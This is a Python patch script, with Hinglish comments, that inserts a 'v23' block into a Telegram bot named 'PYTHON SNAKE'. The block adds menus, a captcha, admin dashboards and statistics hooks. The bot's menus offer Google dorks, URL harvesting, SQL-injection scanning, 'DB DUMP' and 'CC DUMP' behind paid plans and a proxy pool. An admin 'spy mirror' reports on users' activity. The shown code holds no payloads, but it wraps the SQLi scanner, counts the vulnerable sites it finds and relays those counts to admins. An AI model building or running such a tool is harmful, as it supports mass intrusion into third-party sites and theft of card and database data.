                ev = _V19_STOP.get(target)
            except Exception:
                ev = None
            if ev is not None:
                ev.set()
            try:
                se = stop_events.get(target)
                if se is not None:
                    se.set()
            except Exception:
                pass
            await q.answer("🛑 Stopped %d" % target)
        except Exception:
            pass
        txt, kb = _v23a_live_view()
        try:
            await _edit(txt, kb)
        except Exception:
            pass
        return MENU
    if data == "v23a_stats":
        txt, kb = _v23a_stats_view()
        try:
            await _edit(txt, kb)
        except Exception:
            pass
        return MENU
    if data == "v23a_proxy":
        try:
            pool = _v22_proxy_load()
            best = min([int(v.get("ms") or 9999) for v in pool.values()], default=0)
            await _edit("🧅 <b>PROXY POOL (v2)</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                        "🗄 Alive pool: <code>%s</code>\n⚡ Best: <code>%s ms</code>\n"
                        "🌐 Legacy pool: <code>%s</code>"
                        % (format(len(pool), ","), best or "-", format(len(global_proxy_pool or []), ",")),
                        InlineKeyboardMarkup([
                            [InlineKeyboardButton("🔁 SCAN + REFILL", callback_data="v23_proxy")],
                            [InlineKeyboardButton("🗑 CLEAR POOL", callback_data="v22_proxyclear")],
                            [InlineKeyboardButton("⬅️ ADMIN PANEL", callback_data="v23a_home")],
                        ]))
        except Exception:
            pass
        return MENU
    if data == "v23a_engine":
        try:
            cf = _v21_cfg()
        except Exception:
            cf = {}
        try:
            await _edit("⚙️ <b>ENGINE DEFAULTS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                        "🎚 Mode: <code>%s</code>\n⚡ Threads: <code>%s</code>\n📄 Pages: <code>%s</code>\n"
                        "🌐 Wayback: <b>%s</b> • CommonCrawl: <b>%s</b>"
                        % (str(cf.get("mode", "?")).upper(), cf.get("threads", "?"), cf.get("pages", "?"),
                           "ON" if cf.get("use_cdx") else "OFF", "ON" if cf.get("use_cc") else "OFF"),
                        _v23a_engine_kb())
        except Exception:
            pass
        return MENU
    return MENU

# ─────────────────────────────────────────────────────────────────────────────
#  PART C — stats hooks, admin mirror, router, commands
# ─────────────────────────────────────────────────────────────────────────────
_V23_BOT = {"bot": None}
_V23_PING_TS: dict = {}


def _v23_note_run(uid: int, kind: str, st: dict) -> None:
    """Run counters (admin dashboard ke liye) + admin ko activity ping."""
    try:
        _v23_init()
        uid = int(uid)
        st = st or {}
        today = _v23_today()
        days = _V23_STATS.setdefault("days", {})
        d = days.setdefault(today, {})
        bu = _V23_STATS.setdefault("by_user", {}).setdefault(str(uid), {})
        rec = _V23_USERS.setdefault(str(uid), {})
        if kind == "parse":
            urls = int(st.get("unique") or 0)
            for box in (d, bu, rec):
                box["urls"] = int(box.get("urls") or 0) + urls
        else:
            vulns = int(st.get("vulns") or 0)
            for box in (d, bu, rec):
                box["vulns"] = int(box.get("vulns") or 0) + vulns
                box["runs"] = int(box.get("runs") or 0) + 1
        _v23_flush(force=True)
        bot = _V23_BOT.get("bot")
        if bot is None:
            return
        now = time.time()
        if now - float(_V23_PING_TS.get(str(uid)) or 0) < 20:
            return
        _V23_PING_TS[str(uid)] = now
        nm = rec.get("name") or "user"
        un = ("@" + rec["uname"]) if rec.get("uname") else ""
        txt = ("🕵️ <b>USER ACTIVITY</b>\n"
               "👤 %s %s <code>%s</code>\n" % (nm[:24], un, uid)
               + (("🌍 URLs: <code>%s</code>" % format(int(st.get("unique") or 0), ","))
                  if kind == "parse" else
                  ("🛡️ Tested: <code>%s</code> • ✅ vulns: <code>%s</code>"
                   % (format(int(st.get("scanned") or 0), ","), format(int(st.get("vulns") or 0), ",")))))
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("📂 HIS FILES", callback_data="uv_u_%d_A_0" % uid)]])
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            return
        for aid in list(ADMIN_IDS or []):
            try:
                if int(aid) == uid:
                    continue
                loop.create_task(bot.send_message(chat_id=int(aid), text=txt,
                                                  parse_mode=ParseMode.HTML,
                                                  reply_markup=kb, disable_notification=True))
            except Exception:
                pass
    except Exception:
        pass


_v23_prev_deep_parse = _v19_deep_parse


async def _v19_deep_parse(dorks, uid, progress=None):   # noqa: F811
    res = await _v23_prev_deep_parse(dorks, uid, progress)
    try:
        _v23_note_run(uid, "parse", (res or {}).get("stats") or {})
    except Exception:
        pass
    return res


_v23_prev_sqli_scan = _v19_sqli_scan


async def _v19_sqli_scan(urls, uid, progress=None, fast: bool = False):   # noqa: F811
    res = await _v23_prev_sqli_scan(urls, uid, progress, fast=fast)
    try:
        _v23_note_run(uid, "sqli", (res or {}).get("stats") or {})
    except Exception:
        pass
    return res


# ── master callback router ───────────────────────────────────────────────────
async def _v23_handle_cb(update, context, data: str) -> int:
    q = update.callback_query
    try:
        if context is not None and context.bot is not None:
            _V23_BOT["bot"] = context.bot
    except Exception:
        pass
    _v23_touch(update, context)

    # ---- captcha ----
    if data == "v23_cap_refresh":
        txt, kb = _v23_captcha_new(context)
        try:
            await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return MENU
    if data.startswith("v23_cap_"):
        try:
            got = int(data.rsplit("_", 1)[1])
        except Exception:
            got = -1
        want = None
        try:
            want = int(context.user_data.get("v23_cap"))
        except Exception:
            want = None
        if want is not None and got == want:
            _v23_mark_verified(update.effective_user.id)
            try:
                await q.edit_message_text("✅ <b>Verified!</b> Welcome 🐍", parse_mode=ParseMode.HTML)
            except Exception:
                pass
            try:
                pth = _v22_logo_path()
                if pth:
                    with open(pth, "rb") as fh:
                        await q.message.reply_photo(fh, caption="🐍 <b>PYTHON SNAKE</b>",
                                                    parse_mode=ParseMode.HTML)
            except Exception:
                pass
            await _v23_send_home(update, context)
            return MENU
        txt, kb = _v23_captcha_new(context)
        try:
            await q.edit_message_text("❌ Galat jawab — dobara try karo.\n\n" + txt,
                                      reply_markup=kb, parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return MENU

    # ---- home / manual ----
    if data == "v23_home":
        await _v23_send_home(update, context, edit=True)
        return MENU
    if data == "v23_manual":
        return await _v23_manual_ui(update, context)
    if data == "v23_classic":
        txt = ("🕰 <b>CLASSIC MENU</b>\n"
               "━━━━━━━━━━━━━━━━━━━━━\n"
               "Purana poora bot — KEYWORDS • DORKS • DEEP PARSER • SQLI • DB DUMP\n"
               "• AUTO-PILOT • REFINERY • CC DUMP\n\n"
               "👇 Neeche se button chuno")
        try:
            await q.edit_message_text(txt, reply_markup=_v23_classic_kb(), parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return MENU
    if data == "v23_latest":
        try:
            await q.edit_message_text(_v19_panel_text(), reply_markup=_v19_panel_kb(),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return MENU

    # ---- proxy ----
    if data in ("v23_proxy", "v22_proxy_scan"):
        return await _v23_proxy_ui(update, context)

    # ---- plan gate: seedha kaam, warna friendly card ----
    if data in ("v22_auto", "v22_uni") or data.startswith("v22_auto_") or data.startswith("v22_uni_"):
        try:
            ok = has_access(update.effective_user.id)
        except Exception:
            ok = True
        if not ok:
            try:
                await q.edit_message_text(
                    "🔒 <b>PLAN CHAHIYE</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    "Ye feature use karne ke liye active plan ya trial chahiye.\n\n"
                    "🔑 Key hai to REDEEM karo\n"
                    "🍷 Naya plan lena hai to PREMIUM dabao\n"
                    "🎁 Naye user ko free trial milta hai",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="menu_redeem")],
                        [InlineKeyboardButton("🍷 PREMIUM / PLANS", callback_data="menu_purchase")],
                        [InlineKeyboardButton("⬅️ BACK", callback_data="v23_home")],
                    ]), parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return MENU

    # ---- admin ----
    if data.startswith("v23a_") or data == "admin_panel":
        return await _v23a_handle(update, context, data)

    # ---- v22 ke sab buttons (pehle dead the) ----
    if data.startswith("v22_"):
        return await _v19_callback_router(update, context, data)

    return MENU


_v23_prev_button_handler = button_handler


async def button_handler(update, context):   # noqa: F811
    """Final entry — sab callbacks yahin se guzarte hain."""
    q = getattr(update, "callback_query", None)
    data = (q.data or "") if q is not None else ""
    if q is not None and data:
        uid = getattr(getattr(update, "effective_user", None), "id", 0) or 0
        # legacy admin-only buttons ka guard (user panel me leak na ho)
        if data.startswith(("admin_", "v14_", "v18_", "v19a_", "lf_kill_")):
            try:
                if not is_admin(uid):
                    await q.answer("❌ Admin only", show_alert=True)
                    return MENU
            except Exception:
                return MENU
        if data.startswith(("v22_", "v23_", "v23a_")) or data == "admin_panel":
            try:
                await q.answer()
            except Exception:
                pass
            try:
                return await _v23_handle_cb(update, context, data)
            except Exception as exc:
                logger.exception("v23 callback error [%s]: %s", data, exc)
                return MENU
    return await _v23_prev_button_handler(update, context)


# ── commands ─────────────────────────────────────────────────────────────────
async def _v23_menu_cmd(update, context) -> None:
    _v23_touch(update, context)
    await _v23_send_home(update, context)


async def _v23_captcha_cmd(update, context) -> None:
    uid = update.effective_user.id
    _V23_VERIFIED.discard(int(uid))
    _v23_flush(force=True)
    await _v23_send_captcha(update, context)


async def _v23_spy_cmd(update, context) -> None:
    uid = update.effective_user.id
    msg = update.effective_message
    if not is_admin(uid):
        await msg.reply_text("❌ Admin only")
        return
    new_st = not _v9_is_spy_enabled()
    _v9_set_spy_enabled(new_st)
    await msg.reply_text("🕵️ Spy mirror: <b>%s</b>" % ("ON" if new_st else "OFF"),
                         parse_mode=ParseMode.HTML)


_v23_prev_admin_cmd = admin_cmd


async def admin_cmd(update, context):   # noqa: F811
    uid = update.effective_user.id
    if not is_admin(uid):
        return await _v23_prev_admin_cmd(update, context)
    try:
        await update.effective_message.reply_text(_v23_dash_text(), reply_markup=make_admin_menu(),
                                                  parse_mode=ParseMode.HTML)
    except Exception:
        return await _v23_prev_admin_cmd(update, context)
    return MENU


async def _v22_classic_cmd(update, context) -> None:   # noqa: F811
    msg = update.effective_message
    try:
        await msg.reply_text("🕰 <b>CLASSIC MENU</b> — purana poora bot",
                             reply_markup=_v23_classic_kb(), parse_mode=ParseMode.HTML)
    except Exception:
        pass


try:
    _v23_init()
    logger.info("🐍 PYTHON SNAKE %s loaded — captcha • clean menu • admin v2 • routing fixed", _V23_TAG)
except Exception:
    pass
# ═══ PYTHON SNAKE v23 END ═══
'''

CMD_ANCHOR = '    app.add_handler(CommandHandler(["brand", "logo"], _v22_brand_cmd), group=-1)'
CMD_ADD = CMD_ANCHOR + '''
    app.add_handler(CommandHandler(["menu", "home"], _v23_menu_cmd), group=-1)
    app.add_handler(CommandHandler("captcha", _v23_captcha_cmd), group=-1)
    app.add_handler(CommandHandler("spy", _v23_spy_cmd), group=-1)'''


def patch(target: str) -> None:
    if not os.path.isfile(target):
        raise SystemExit("❌ %s nahi mila" % target)
    with open(target, "r", encoding="utf-8", errors="ignore") as f:
        src = f.read()

    for need in ("_V22_SCALES", "_v22_handle", "_V19_TAG"):
        if need not in src:
            raise SystemExit("❌ %s nahi mila — pehle v22 patch apply karo." % need)

    # idempotent cleanup
    src = re.sub(re.escape(MARK_START) + r".*?" + re.escape(MARK_END) + r"\n*", "", src, flags=re.S)
    src = src.replace(CMD_ADD, CMD_ANCHOR)

    if CMD_ANCHOR not in src:
        raise SystemExit("❌ v22 command anchor nahi mila.")
    src = src.replace(CMD_ANCHOR, CMD_ADD, 1)
    src = src.replace("V22-PYTHON-SNAKE", "V23-PYTHON-SNAKE")

    m = re.search(r'^if __name__ == ["\']__main__["\']:', src, re.M)
    if not m:
        raise SystemExit("❌ __main__ block nahi mila.")
    src = src[:m.start()] + BLOCK.strip("\n") + "\n\n\n" + src[m.start():]

    backup = "%s.v23_backup_%s" % (target, datetime.now().strftime("%Y%m%d_%H%M%S"))
    shutil.copyfile(target, backup)
    with open(target, "w", encoding="utf-8") as f:
        f.write(src)
    try:
        py_compile.compile(target, doraise=True)
    except Exception as exc:
        shutil.copyfile(backup, target)
        raise SystemExit("❌ Compile fail — rollback. %s" % exc)

    print("=" * 78)
    print("  ✅ PYTHON SNAKE v23 APPLIED")
    print("=" * 78)
    print("  Target   : %s" % target)
    print("  Backup   : %s" % os.path.basename(backup))
    print("  Fixed    : v22 buttons dead the -> ab live (router patch)")
    print("  New      : /start captcha • clean 7-button menu • plain fonts")
    print("  Admin    : dashboard • users • keys • live runs • vault • spy • stats")
    print("  Commands : /menu /captcha /spy")
    print("=" * 78)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 python_snake_v23.py bot_fixed.py")
        raise SystemExit(1)
    patch(sys.argv[1])
